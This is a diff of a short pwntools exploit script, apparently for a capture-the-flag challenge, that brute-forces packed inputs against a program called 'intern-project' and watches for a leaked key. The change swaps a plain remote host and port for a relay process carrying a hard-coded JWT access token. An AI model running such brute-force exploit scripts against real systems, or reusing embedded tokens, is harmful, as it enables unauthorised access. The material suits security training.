@@ -1,19 +1,14 @@
 from pwn import *
-context.log_level = 'error'
 PROGNAME   = "src/intern-project"
-REMOTEIP   = "127.0.0.1"
-REMOTEPORT = 9005
 
 for i in range(0, 0x10000):
     if args.REMOTE:
-        p = remote(REMOTEIP, REMOTEPORT)
-        elf = ELF(PROGNAME)
+        p = process(["./cli-relay", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFiQGdlZWdsZS5vcmciLCJzZXJ2aWNlIjoidWJlcnByb3h5QHNlcnZpY2VzLmdlZWdsZS5vcmciLCJleHAiOjE1NzQ1ODE3NjR9.Q4IVZ28t9s73-E7Lwr42GsbpXi4bqJF9MpVTkKJrllU", "intern-project.corp.geegle.org"])
     else:
         p = process(PROGNAME)
-        elf = p.elf
     p.sendlineafter(": ", p64(i))
 
-    p.recvuntil("Key is 0x")
+    p.recvuntil("Key is 0x", timeout=30)
     key = int(p.recvline(), 16)
 
     if key == 0xd8:
